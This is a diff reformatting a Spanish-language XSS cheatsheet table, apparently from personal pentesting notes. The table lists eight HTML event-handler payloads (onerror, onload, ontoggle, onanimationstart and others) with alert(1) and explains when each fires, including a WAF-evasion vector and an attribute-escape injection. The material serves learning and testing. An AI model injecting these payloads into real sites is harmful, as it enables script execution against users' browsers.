@@ -14,17 +14,20 @@ linked:
 ___
 
 ## Cheatsheet
+```
+<pre><code></code></pre>
+```
 
-|**Vector / Manejador**|**Payload de Ejemplo**|**Contexto de Inyección y Explotación**|
-|---|---|---|
-|`onerror`|`<img src="x" onerror="alert(1)">`|**Automático.** El evento se dispara instantáneamente cuando el navegador no puede cargar el recurso (origen inválido `x`). Es uno de los vectores más confiables y utilizados.|
-|`onload`|`<svg onload="alert(1)">`|**Automático.** Ejecuta el código tan pronto como el elemento se renderiza en el [[DOM]]. Excelente alternativa cuando las etiquetas de imagen están filtradas.|
-|`onfocus`|`<input autofocus onfocus="alert(1)">`|**Automático / Interactivo.** Al combinarlo con el atributo `autofocus`, obligo al navegador a centrarse en el elemento de inmediato, disparando el evento sin requerir un clic del usuario.|
-|`onmouseover`|`<h1 onmouseover="alert(1)">Texto</h1>`|**Interactivo.** Requiere que la víctima pase el cursor por encima del elemento. Útil para evadir bloqueos estrictos sobre eventos de ejecución automática.|
-|`onclick`|`<a href="#" onclick="alert(1)">Click</a>`|**Interactivo.** Depende de la acción explícita del usuario. Frecuente al escapar del valor de un atributo para inyectar un nuevo manejador (`" onclick="alert(1)`).|
-|`onanimationstart`|`<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">`|**Automático (Avanzado).** Vector de evasión de WAF. Vincula una animación CSS vacía a un elemento cualquiera, disparando el evento en cuanto el motor de estilos la procesa.|
-|`ontoggle`|`<details open ontoggle="alert(1)">`|**Automático.** El atributo `open` fuerza el cambio de estado del elemento `<details>` al renderizarse, lo que inmediatamente desencadena el manejador `ontoggle`.|
-|`onhashchange`|`<body onhashchange="alert(1)"><a href="#x">Ir</a>`|**Interactivo.** Se ejecuta cuando cambia el fragmento de la URL. Muy efectivo en aplicaciones de página única (SPA) donde la navegación se basa en anclas.|
+|               **Vector / Manejador**               |                                               **Payload de Ejemplo**                                                |                                                                                 **Contexto de Inyección y Explotación**                                                                                  |
+| :------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
+|       <br><pre><code>`onerror`</code></pre>        |                           <br><pre><code>`<img src="x" onerror="alert(1)">`</code></pre>                            |       <br>**Automático.** El evento se dispara instantáneamente cuando el navegador no puede cargar el recurso (origen inválido `x`). Es uno de los vectores más confiables y utilizados.<br><br>        |
+|        <br><pre><code>`onload`</code></pre>        |                                <br><pre><code>`<svg onload="alert(1)">`</code></pre>                                |               <br>**Automático.** Ejecuta el código tan pronto como el elemento se renderiza en el [[DOM]]. Excelente alternativa cuando las etiquetas de imagen están filtradas.<br><br>                |
+|       <br><pre><code>`onfocus`</code></pre>        |                         <br><pre><code>`<input autofocus onfocus="alert(1)">`</code></pre>                          | <br>**Automático / Interactivo.** Al combinarlo con el atributo `autofocus`, obligo al navegador a centrarse en el elemento de inmediato, disparando el evento sin requerir un clic del usuario.<br><br> |
+|     <br><pre><code>`onmouseover`</code></pre>      |                         <br><pre><code>`<h1 onmouseover="alert(1)">Texto</h1>`</code></pre>                         |                 <br>**Interactivo.** Requiere que la víctima pase el cursor por encima del elemento. Útil para evadir bloqueos estrictos sobre eventos de ejecución automática.<br><br>                  |
+|       <br><pre><code>`onclick`</code></pre>        |                       <br><pre><code>`<a href="#" onclick="alert(1)">Click</a>`</code></pre>                        |             <br>**Interactivo.** Depende de la acción explícita del usuario. Frecuente al escapar del valor de un atributo para inyectar un nuevo manejador (`" onclick="alert(1)`).<br><br>             |
+| <br><br><pre><code>`onanimationstart`</code></pre> | <br><pre><code>`<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">`</code></pre> |            <br>**Automático (Avanzado).** Vector de evasión de WAF. Vincula una animación CSS vacía a un elemento cualquiera, disparando el evento en cuanto el motor de estilos la procesa.             |
+|       <br><pre><code>`ontoggle`</code></pre>       |                          <br><pre><code>`<details open ontoggle="alert(1)">`</code></pre>                           |              <br>**Automático.** El atributo `open` fuerza el cambio de estado del elemento `<details>` al renderizarse, lo que inmediatamente desencadena el manejador `ontoggle`.<br><br>              |
+|     <br><pre><code>`onhashchange`</code></pre>     |                   <br><pre><code>`<body onhashchange="alert(1)"><a href="#x">Ir</a>`</code></pre>                   |                 <br>**Interactivo.** Se ejecuta cuando cambia el fragmento de la URL. Muy efectivo en aplicaciones de página única (SPA) donde la navegación se basa en anclas.<br><br>                  |
 
 ### Inyección en Contextos Preexistentes
 
